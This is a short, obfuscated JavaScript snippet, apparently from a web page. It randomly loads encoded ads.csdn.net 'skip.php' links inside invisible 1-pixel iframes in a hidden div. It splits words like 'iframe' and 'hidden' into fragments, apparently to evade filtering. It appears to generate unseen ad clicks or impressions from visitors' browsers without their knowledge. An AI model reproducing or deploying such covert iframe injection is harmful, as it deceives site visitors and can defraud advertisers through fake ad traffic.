(function(){
    var a = function () {};
    a.u = [{"l":"http:\/\/ads.csdn.net\/skip.php?subject=B24LIwg3AWUGIgNfVD8CNgNqAjZZOlRnVXMDYlRiU3dXNF11CiVTOwInVTMDXlNqADANMQVgUmNRZAAmU2hXYQdkCzAIDAFpBjQDPVRkAmUDYwI7WShUJlU5A2JUaFNeVyFdcQpsU2YCZFVwA3VTegAkDWkFb1Im","r":0.11},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=BWwBKV1iDWlRdVQIUToCNgFoAzdVMVBrV3EFZFRiAiZUN1x0XXJXP1RxUjQHWlNqUmJQbFA2U2MAMgAmVG9bbQVmATpdWQ1lUWNUalFhAmcBbAMyVSRQIlc7BWRUaAIPVCJccF07V25UN1J3B3FTelJ2UDRQOlMn","r":0.24},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=A2pddQ4xAmYBJQhUBm1XY1Q9BDAEZgI3VnBXNgUzAiYAYw0lAS4GbgInA2UBXAQ9UWEFOVUzAjABNwchAjlXYQNgXWYOCgJqATMINgY2VzFUMgQyBHUCcFY6VzYFOQIPAHYNIQFnBjECYgMmAXcELVF1BWFVPwJ2","r":0.18},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=Bm8BKQk2UzcBJQJeVT4BNVM6DTkHZVVvU3UGZwcxUHQAY1tzCiUAaAMmBmAOU1ZvATEHO1cxBTRRYVZwAToCNAZlAToJDVM7ATMCPFVlAWdTNQ00B3ZVJ1M\/BmcHO1BdAHZbdwpsADADZQY1DipWcgEsB3ZXZQU6USc=","r":0.28},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=AGledg0yUTUDJwZaBW4FMVQ9AzcHZFFhUnRQMQQyACQNbgAoXnEDaw4rVzEGW1duATFSbgVqByNUPVczATZbaABZXm0NMlFtA2cGMgUyBWRUJgNyBzxRMlI8UA8EJgAkDTYAaV40AyQOLFctBnRXYgFoUiU=","r":0.09},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=UDkMJAk2UDQGIgdbA2hTZ1U8ADRZN1NlACZRMAUzAiYHZAAoDyABaQYjUDYFWFFoUmJRbQBmUmJUY1F3Bj1XYVAzDDcJDVA4BjQHOQMzUzpVNQA5WShTIQBsUTAFOQIPB3EALA9pATEGZ1BjBSFRdVJ\/USAAMlJtVCI=","r":0.47},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=Vj8AKAg3B2NSdlcLVT4MOFU8VmJZNgM4V3FUNVVjUXUEZ1pyAC8AaAInB2EBXFBpATEBPVUzVWVTZQMlVW5RZ1Y1ADsIDAdvUmBXaVVlDGVVNVZuWSgDcVc7VDVVaVFcBHJadgBmADACYgc0ASVQdAEsAXBVZ1VqUyU=","r":0.44}];
    a.to = function () {
        if(typeof a.u == "object"){
            for (var i in a.u) {
                var r = Math.random();
                if (r < a.u[i].r)
                    a.go(a.u[i].l + '&r=' + r);
            }
        }
    };
    a.go = function (url) {
        var e = document.createElement("if" + "ra" + "me");
        e.style.width = "1p" + "x";
        e.style.height = "1p" + "x";
        e.style.position = "ab" + "sol" + "ute";
        e.style.visibility = "hi" + "dden";
        e.src = url;
        var t_d = document.createElement("d" + "iv");
        t_d.appendChild(e);
        var d_id = "a52b5334d";
        if (document.getElementById(d_id)) {
            document.getElementById(d_id).appendChild(t_d);
        } else {
            var a_d = document.createElement("d" + "iv");
            a_d.id = d_id;
            a_d.style.width = "1p" + "x";
            a_d.style.height = "1p" + "x";
            a_d.style.display = "no" + "ne";
            document.body.appendChild(a_d);
            document.getElementById(d_id).appendChild(t_d);
        }
    };
    a.to();
})();